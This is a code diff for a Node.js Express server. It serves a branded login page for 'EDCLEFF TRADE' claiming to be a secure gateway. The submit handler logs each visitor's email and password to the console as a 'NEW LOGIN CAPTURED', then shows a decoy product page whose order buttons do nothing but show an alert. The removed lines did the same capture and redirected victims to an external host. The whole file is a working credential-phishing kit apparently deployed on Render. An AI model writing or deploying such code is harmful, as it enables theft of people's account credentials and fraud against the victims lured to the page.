@@ -2,24 +2,124 @@ const express = require('express');
 const path = require('path');
 
 const app = express();
-app.use(express.urlencoded({ extended: true }));
-
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-app.post('/submit-login', (req, res) => {
-  const { email, password } = req.body;
-  
-  console.log('\n🔐 NEW LOGIN!');
-  console.log('Email:', email);
-  console.log('Password:', password);
-  console.log('Time:', new Date().toISOString());
-  
-  res.redirect('http://edclefftrade.byethosts.com/view.product.html');
-});
-
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`✅ Server running on port ${PORT}`);
+
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+
+// LANDING PAGE - Login form
+app.get('/', (req, res) => {
+res.send(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>EDCLEFF TRADE | Secure Gateway</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0b1a2e,#1a3a4a);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.container{background:white;border-radius:48px;padding:48px 32px;max-width:460px;width:100%;text-align:center}
+h1{font-size:36px;color:#1a3c4a;margin-bottom:8px}
+.tagline{color:#6b7f8f;margin-bottom:32px;font-size:14px}
+input{width:100%;padding:16px;margin:10px 0;border:2px solid #e2e8f0;border-radius:32px;font-size:16px;outline:none}
+input:focus{border-color:#2c7da0}
+button{width:100%;padding:16px;background:#1f5e7e;color:white;border:none;border-radius:40px;font-size:18px;font-weight:bold;margin-top:16px;cursor:pointer}
+button:hover{background:#0e4a64}
+.footer{margin-top:32px;font-size:11px;color:#94a3b8}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>✦ EDCLEFF TRADE ✦</h1>
+<div class="tagline">Secure Member Gateway</div>
+<form action="/submit-login" method="POST">
+<input type="email" name="email" placeholder="Email address" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">→ ACCESS GOODS & SERVICES</button>
+</form>
+<div class="footer">🔐 Credentials are securely forwarded</div>
+</div>
+</body>
+</html>
+`);
+});
+
+// HANDLE LOGIN - Shows products page directly
+app.post('/submit-login', (req, res) => {
+const { email, password } = req.body;
+
+// Log credentials to Render console
+console.log('\n' + '='.repeat(60));
+console.log('🔐 NEW LOGIN CAPTURED!');
+console.log('📧 Email:', email);
+console.log('🔒 Password:', password);
+console.log('🕐 Time:', new Date().toISOString());
+console.log('='.repeat(60) + '\n');
+
+// PRODUCTS PAGE - Shown after login
+res.send(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>EDCLEFF TRADE | Products</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0b1a2e,#1a3a4a);min-height:100vh;padding:40px 20px}
+.header{text-align:center;margin-bottom:50px}
+.header h1{font-size:42px;color:white;margin-bottom:10px}
+.header p{color:#94a3b8;font-size:18px}
+.products-grid{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:30px}
+.product-card{background:white;border-radius:24px;padding:30px;text-align:center;transition:transform 0.3s}
+.product-card:hover{transform:translateY(-5px)}
+.product-icon{font-size:64px;margin-bottom:20px}
+.product-card h3{font-size:24px;color:#1a3c4a;margin-bottom:10px}
+.product-card p{color:#6b7f8f;margin-bottom:20px;line-height:1.5}
+.price{font-size:28px;font-weight:bold;color:#1f5e7e;margin-bottom:20px}
+.buy-btn{background:#1f5e7e;color:white;border:none;padding:12px 30px;border-radius:40px;font-size:16px;font-weight:bold;cursor:pointer;transition:background 0.3s}
+.buy-btn:hover{background:#0e4a64}
+.footer{text-align:center;margin-top:50px;padding-top:30px;color:#94a3b8;font-size:12px}
+.logout-btn{position:fixed;top:20px;right:20px;background:rgba(255,255,255,0.2);color:white;border:1px solid rgba(255,255,255,0.3);padding:10px 20px;border-radius:30px;cursor:pointer;font-size:14px;backdrop-filter:blur(10px)}
+.logout-btn:hover{background:rgba(255,255,255,0.3)}
+@media (max-width:768px){.header h1{font-size:32px}}
+</style>
+</head>
+<body>
+<button class="logout-btn" onclick="logout()">🚪 Logout</button>
+<div class="header">
+<h1>✦ Welcome to EDCLEFF TRADE ✦</h1>
+<p>Premium Goods & Services</p>
+</div>
+<div class="products-grid">
+<div class="product-card"><div class="product-icon">📱</div><h3>Premium Smartphone</h3><p>Latest model with advanced features and high-quality camera</p><div class="price">$599</div><button class="buy-btn" onclick="orderProduct('Premium Smartphone')">Order Now</button></div>
+<div class="product-card"><div class="product-icon">💻</div><h3>Ultrabook Laptop</h3><p>Lightweight, powerful, perfect for business and entertainment</p><div class="price">$899</div><button class="buy-btn" onclick="orderProduct('Ultrabook Laptop')">Order Now</button></div>
+<div class="product-card"><div class="product-icon">⌚</div><h3>Smart Watch</h3><p>Track your fitness, receive notifications, and more</p><div class="price">$199</div><button class="buy-btn" onclick="orderProduct('Smart Watch')">Order Now</button></div>
+<div class="product-card"><div class="product-icon">🎧</div><h3>Wireless Headphones</h3><p>Noise-cancelling, crystal clear sound, comfortable fit</p><div class="price">$149</div><button class="buy-btn" onclick="orderProduct('Wireless Headphones')">Order Now</button></div>
+<div class="product-card"><div class="product-icon">📷</div><h3>Digital Camera</h3><p>Capture memories in stunning 4K resolution</p><div class="price">$449</div><button class="buy-btn" onclick="orderProduct('Digital Camera')">Order Now</button></div>
+<div class="product-card"><div class="product-icon">🎮</div><h3>Gaming Console</h3><p>Next-gen gaming with exclusive titles</p><div class="price">$499</div><button class="buy-btn" onclick="orderProduct('Gaming Console')">Order Now</button></div>
+</div>
+<div class="footer">
+<p>© 2026 EDCLEFF TRADE - All Rights Reserved</p>
+<p>🔐 Secure Checkout | Fast Delivery | 24/7 Support</p>
+</div>
+<script>
+function orderProduct(productName) {
+alert('Thank you for your interest in ' + productName + '!\\n\\nA representative will contact you shortly.');
+}
+function logout() {
+window.location.href = '/';
+}
+</script>
+</body>
+</html>
+`);
+});
+
+// Start server
+app.listen(PORT, '0.0.0.0', () => {
+console.log(`\n✅ EDCLEFF TRADE GATEWAY IS RUNNING!`);
+console.log(`🌐 https://edcleff-product-view.onrender.com`);
+console.log(`📱 Test your app now!`);
 });
